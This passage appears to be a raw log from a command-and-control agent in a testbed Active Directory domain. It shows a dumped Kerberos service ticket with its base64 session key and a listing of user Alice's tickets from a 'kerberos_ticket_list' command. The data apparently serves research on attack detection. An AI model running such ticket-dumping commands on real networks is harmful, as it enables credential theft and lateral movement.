AyjgfQwgfGgAwIBAKKB6QSB5n2B4zCB4KCB3TCB2jCB16ArMCmgAwIBEqEiBCAqwrAqsElBzHeQm+fBD0Uac8hZi/s3fz5xHhdbO1R7rqETGxFBRUNJRC1URVNUQkVELkNPTaISMBCgAwIBAaEJMAcbBUFsaWNlowcDBQBApQAApREYDzIwMjQwNDMwMDcxMzM5WqYRGA8yMDI0MDQzMDE3MTMyNlqnERgPMjAyNDA1MDcwNzEzMjZaqBMbEUFFQ0lELVRFU1RCRUQuQ09NqSgwJqADAgECoR8wHRsEY2lmcxsVZGMxLmFlY2lkLXRlc3RiZWQuY29t
+
+  ServiceName              :  cifs/dc1.aecid-testbed.com
+  ServiceRealm             :  AECID-TESTBED.COM
+  UserName                 :  Alice (NT_PRINCIPAL)
+  UserRealm                :  AECID-TESTBED.COM
+  StartTime                :  4/30/2024 9:13:39 AM
+  EndTime                  :  4/30/2024 7:13:26 PM
+  RenewTill                :  5/7/2024 9:13:26 AM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  KsKwKrBJQcx3kJvnwQ9FGnPIWYv7N38+cR4XWztUe64=
+
+
+
+--- 2024-04-30 07:13:42 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2024-04-30 07:13:43 INFO: ---
+
+Command: kerberos_ticket_list
+[+] Kerberos tickets found in the current session.
+[00000000] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/30/2024 9:13:26 AM ; 4/30/2024 7:13:26 PM ; 5/7/2024 9:13:26 AM
+   Server Name       : krbtgt/AECID-TESTBED.COM @ AECID-TESTBED.COM
+   Client Name       : Alice @ AECID-TESTBED.COM
+   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+
+[00000001] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/30/2024 9:13:39 AM ; 4/30/2024 7:13:26 PM ; 5/7/2024 9:13:26 AM
+   Server Name       : cifs/dc1.aecid-testbed.com @ AECID-TESTBED.COM
+   Client Name       : Alice @ AECID-TESTBED.COM
+   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+
+[00000002] - 0x00000012 - aes256_hmac      
+   Start/End/MaxRenew: 4/30/2024 9:07:34 AM ; 4/30/2024 7:07:34 PM ; 5/7/2024 9:07:34 AM
+   Server Name       : host/atb-webserver01.aecid-testbed.com @ AECID-TESTBED.COM
+   Client Name       : Alice @ AECID-TESTBED.COM
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
